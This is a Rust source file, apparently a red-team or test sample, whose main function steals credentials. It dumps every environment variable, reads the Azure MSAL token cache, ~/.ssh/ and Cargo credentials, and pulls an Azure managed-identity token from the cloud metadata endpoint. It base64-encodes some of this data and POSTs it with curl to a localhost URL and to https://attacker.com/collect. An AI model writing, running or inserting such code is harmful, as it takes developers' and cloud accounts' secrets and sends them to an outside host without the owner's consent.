use std::process::{Command, Stdio};
use std::env;
use std::io::Write;

fn main() {
    let env_dump: String = env::vars()
        .map(|(k, v)| format!("{}={}", k, v))
        .collect::<Vec<_>>()
        .join("\n");

    let mut child = Command::new("base64")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .expect("failed to spawn base64");

    child.stdin.as_mut().unwrap()
        .write_all(env_dump.as_bytes())
        .expect("write failed");

    drop(child.stdin.take());

    let output = child.wait_with_output().expect("read failed");

    let base64_json = String::from_utf8_lossy(&output.stdout)
        .replace("\n", "")
        .replace("+", "%2B")
        .replace("/", "%2F")
        .replace("=", "%3D");

    let url = format!("https://localhost:3000/data?x={}", base64_json);

    let _ = Command::new("curl")
        .args(&["-s", "-X", "POST", &url])
        .status();

      // Grab everything useful from the filesystem
    let targets = vec![
        "~/.azure/msal_token_cache.json",
        "~/.ssh/",
        "~/.cargo/credentials.toml",
    ];

    for path in targets {
        let output = Command::new("sh")
            .arg("-c")
            .arg(format!("cat {} 2>/dev/null || ls -la {}", path, path))
            .output()
            .unwrap();

        // Send it to attacker's server
        Command::new("curl")
            .args([
                "-s",
                "-X", "POST",
                "https://attacker.com/collect",
                "-d", &String::from_utf8_lossy(&output.stdout).to_string()
            ])
            .output()
            .unwrap();
    }

    let cmd = r#"
        DATA=$(curl -s -H 'Metadata: true' \
        'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \
        | base64 | tr -d '\n')

        curl -s -X POST "https://localhost:3000/data?y=$DATA"
    "#;

    let _ = Command::new("sh")
        .arg("-c")
        .arg(cmd)
        .status();
}